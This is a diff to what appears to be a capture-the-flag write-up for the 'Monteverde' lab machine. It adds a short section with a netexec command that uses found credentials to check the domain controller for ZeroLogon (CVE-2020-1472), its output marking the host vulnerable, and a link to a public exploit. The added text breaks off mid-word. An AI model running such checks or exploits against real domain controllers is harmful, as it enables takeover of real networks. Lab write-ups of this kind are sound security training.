@@ -382,5 +382,10 @@ However, from the start i noticed an out of date windows version so this is like
 # Domain Admin via ZeroLogon (Unintended)
 
 ```python
-
+nxc smb monteverde.megabank.local -u SABatchJobs -p 'SABatchJobs' -M zerologon
+SMB         10.129.35.54    445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.35.54    445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs 
+ZEROLOGON   10.129.35.54    445    MONTEVERDE       VULNERABLE
+ZEROLOGON   10.129.35.54    445    MONTEVERDE       Next step: https://github.com/dirkjanm/CVE-2020-1472
 ```
+I was righ
